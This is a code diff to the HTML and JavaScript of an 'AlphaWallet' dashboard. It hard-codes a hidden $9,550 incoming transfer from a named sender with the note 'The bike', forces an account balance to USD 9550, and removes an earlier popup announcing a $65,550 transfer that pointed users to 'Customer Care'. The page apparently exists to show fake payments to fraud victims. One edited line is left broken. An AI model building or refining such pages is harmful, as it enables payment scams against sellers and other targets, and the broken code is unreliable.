@@ -261,7 +261,6 @@
           <div class="supportBox">
             <div>Customer Support:</div>
             <div><strong>alphawalllet@gmail.com</strong></div>
-            <div><strong>WhatsApp: +1 (647) 589-7303</strong></div>
           </div>
         </div>
 
@@ -390,13 +389,22 @@
       </div>
 
       <div class="tile history" id="tileHistory">
-        <div class="tileIcon">📜</div>
-        <div>
-          <div class="tileTitle">Transaction History</div>
-          <div class="tileDesc">Detailed record of past activity</div>
-        </div>
-      </div>
+  <div class="tileIcon">📜</div>
+  <div>
+    <div class="tileTitle">Transaction History</div>
+    <div class="tileDesc">View all your transactions</div>
 
+<!-- Hidden details INSIDE the same tile -->
+    <div id="transactionInfo" class="hidden mt-3 p-3 rounded-lg bg-white/10 text-white text-sm">
+      <p><strong>Recipient:</strong> You</p>
+      <p><strong>Sender:</strong> Morgan Lee Ketzner</p>
+      <p><strong>Amount:</strong> $9,550</p>
+      <p><strong>Date:</strong> 14/10/2025</p>
+      <p><strong>Time:</strong> 3:36 PM</p>
+      <p><strong>Note:</strong> The bike</p>
+    </div>
+  </div>
+</div>
       <div class="tile loan" id="tileLoan">
         <div class="tileIcon">🏦</div>
         <div>
@@ -437,7 +445,8 @@
         </div>
       </div>
     </div>
-
+<!-- Transaction Info box -->
+<div id="transactionInfo" class="hidden p-4 mt-4 bg-white/10 text-white rounded-xl shadow-md"></div>
     <!-- virtual card -->
     <div class="virtualCard" style="margin-top:18px">
       <div style="display:flex;justify-content:space-between;align-items:center">
@@ -500,7 +509,7 @@
     </div>
   </section>
 
-  <footer>© 2025 AlphaWallet • Support: alphawalllet@gmail.com • WhatsApp: +1 (647) 589-7303</footer>
+ <footer>© 2025 AlphaWallet • Support: alphawalllet@gmail.com</footer>
 </main>
 
 <!-- modal backdrop -->
@@ -921,7 +930,8 @@ adminCredit.addEventListener('click', async ()=>{
           users[rec].first = data.first || '';
           users[rec].last = data.last || '';
           users[rec].fullName = (data.first||'')+' '+(data.last||'');
-          users[rec].balances = users[rec].balances || zeroBal();
+          users[rec].balances = users[rec].
+          users[rec].balances = { USD: 9550 };
           users[rec].wallet = data.wallet || genWallet();
           users[rec].transactions = users[rec].transactions || [];
           users[rec].createdAt = data.created_at || now();
@@ -1009,13 +1019,8 @@ function doLogout(){
   }catch(e){ console.warn('boot error', e); }
   tabLogin.click();
 })();
-/* --- Transaction History popup --- */
-tileHistory.addEventListener('click', ()=>{
-  modalTitle.textContent = "Transaction Notice";
-  modalBody.textContent = "Incoming transfer of $65,550 — please contact Customer Care for further assistance.";
-  show(modalBackdrop);
-});
+
 </script>
 
 </body>
-</html>/html>
+</html>
